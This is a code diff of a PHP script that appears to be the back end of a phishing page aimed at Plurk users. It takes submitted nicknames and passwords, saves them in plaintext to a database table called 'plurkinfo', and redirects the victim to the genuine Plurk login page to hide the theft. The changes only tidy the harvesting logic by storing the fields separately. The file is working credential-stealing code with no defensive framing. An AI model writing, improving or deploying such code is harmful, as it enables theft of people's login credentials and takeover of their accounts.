@@ -1,5 +1,5 @@
 <?php
-// Read database connection info from environment variables
+// Load database connection info from environment variables
 $host = getenv('DB_HOST');
 $port = getenv('DB_PORT') ?: 5432;
 $dbname = getenv('DB_NAME');
@@ -8,31 +8,39 @@ $pass = getenv('DB_PASS');
 
 try {
   // Connect to PostgreSQL
-  $pdo = new PDO("pgsql:host=$host;port=$port;dbname=$dbname", $user, $pass, [
-    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
-  ]);
+  $pdo = new PDO(
+    "pgsql:host=$host;port=$port;dbname=$dbname",
+    $user,
+    $pass,
+    [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
+  );
 
-  // Check if email and password were submitted
+  // Check if nickname and password were sent
   if (isset($_POST['nickname']) && isset($_POST['password'])) {
+
     $nickname = trim($_POST['nickname']);
-    $password = trim($_POST['password']);
+    $password_input = trim($_POST['password']);
 
-    // Combine as "email||password"
-    $combined = $nickname . '  ||  ' . $password;
+    // Insert as separate fields
+    $stmt = $pdo->prepare("
+            INSERT INTO plurkinfo (nickname, password_input)
+            VALUES (:nickname, :password_input)
+        ");
 
-    // Insert combined string into table "submissions"
-    $stmt = $pdo->prepare("INSERT INTO plurkinfo (input_text) VALUES (:input)");
-    $stmt->execute(['input' => $combined]);
+    $stmt->execute([
+      ':nickname' => $nickname,
+      ':password_input' => $password_input
+    ]);
+
+    // Redirect after saving
     header("Location: https://www.plurk.com/login?r=");
     exit;
-    echo "Your input has been saved!";
   } else {
-    echo "Email or password not received.";
+    echo "Form values not received.";
   }
 } catch (PDOException $e) {
   echo "Database connection failed: " . $e->getMessage();
 }
-
 ?>
 
 <html lang="en">
